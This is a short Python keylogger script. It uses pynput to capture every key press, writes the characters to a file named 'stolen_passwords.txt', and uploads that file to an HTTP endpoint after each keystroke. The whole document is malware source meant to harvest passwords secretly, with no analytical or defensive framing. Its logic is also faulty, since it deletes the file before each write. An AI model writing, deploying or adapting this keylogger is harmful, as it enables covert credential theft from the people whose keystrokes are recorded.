import pyautogui
import pynput
from pynput.keyboard import Key, Listener
import requests
import time
import os

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = key.name

    if char.isalnum():
        file_path = 'uploads/stolen_passwords.txt'
        if os.path.exists(file_path):
            os.remove(file_path)
        with open(file_path, 'a') as f:
            f.write(char)
        time.sleep(0.1)  # Wait for 100ms to reduce the number of requests
        with open(file_path, 'rb') as f:
            requests.post('http://localhost:3000/upload', files={'file': f})
        time.sleep(0.1)  # Wait for 100ms to reduce the number of requests

def on_release(key):
    pass

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()